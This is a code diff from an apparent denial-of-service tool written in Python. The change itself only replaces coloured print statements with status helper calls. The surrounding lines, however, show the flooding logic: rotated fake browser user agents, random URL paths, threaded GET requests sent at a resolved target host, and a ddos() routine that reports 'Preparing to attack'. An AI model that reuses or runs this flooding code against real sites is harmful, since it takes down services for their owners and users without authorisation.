@@ -4,6 +4,7 @@ import string
 import sys
 import threading
 import time
+from tools.status import *
 
 usergent=[]
 usergent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
@@ -24,7 +25,7 @@ def status():
     global thread_num
     thread_num_mutex.acquire(True)
     thread_num += 1
-    print("\33[94mSending packets to target [{}]\33[00m".format(thread_num))
+    print_inloop("Sending packets to target [{}]".format(thread_num))
     thread_num_mutex.release()
 def urli_path():
     msg = str(string.ascii_letters + string.digits + string.punctuation)
@@ -39,7 +40,7 @@ def attack():
         status()
         dos.send("GET /%s HTTP/1.1\nHost: %s \n\n User-Agent: %s" % (url_path, host, random.choice(usergent)))
     except socket.error:
-        print("\33[91mNo connection, server may be down \33[00m")
+        print_warning("No connection, server may be down")
     except:
         pass
     finally:
@@ -57,9 +58,9 @@ def ddos():
         host = str(host).replace("https://", "").replace("http://", "").replace("www.", "")
         ip = socket.gethostbyname(host)
     except socket.gaierror:
-        print(" ERROR\n Make sure you entered a correct website")
+        print_warning("Make sure you entered a correct website")
         sys.exit(1)
-    print("\33[91mPreparing to attack ({}) on port : {}\33[00m".format(ip, port))
+    print_status("Preparing to attack ({}) on port : {}".format(ip, port))
     time.sleep(3)
     all_threads = []
     for i in range(num_requests):
